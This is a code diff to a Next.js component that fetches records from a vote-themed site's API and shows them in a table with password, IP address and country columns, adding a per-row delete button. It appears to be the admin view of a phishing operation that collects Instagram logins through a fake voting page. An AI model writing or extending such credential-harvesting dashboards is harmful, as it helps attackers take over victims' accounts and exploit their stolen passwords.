@@ -1,6 +1,9 @@
+import DeleteTd from "@/app/components/Footer/DeleteTd";
+
 export default async function Instagram() {
-  const res = await fetch("https://vote-apbt.onrender.com/api/instagram");
+  const res = await fetch("https://www.voteforme.site/api/instagram");
   const posts = await res.json();
+
   return (
     <section className="socialMain">
       <div className="table">
@@ -14,6 +17,7 @@ export default async function Instagram() {
                 <th>Password</th>
                 <th>IP Address</th>
                 <th>Country</th>
+                <th>Delete</th>
               </tr>
             </thead>
           </table>
@@ -28,6 +32,7 @@ export default async function Instagram() {
                   <td>{post?.password}</td>
                   <td>{post?.ip_address}</td>
                   <td>{post?.country}</td>
+                  <DeleteTd id={post?.id} socialMedia="instagram" />
                 </tr>
               ))}
             </tbody>
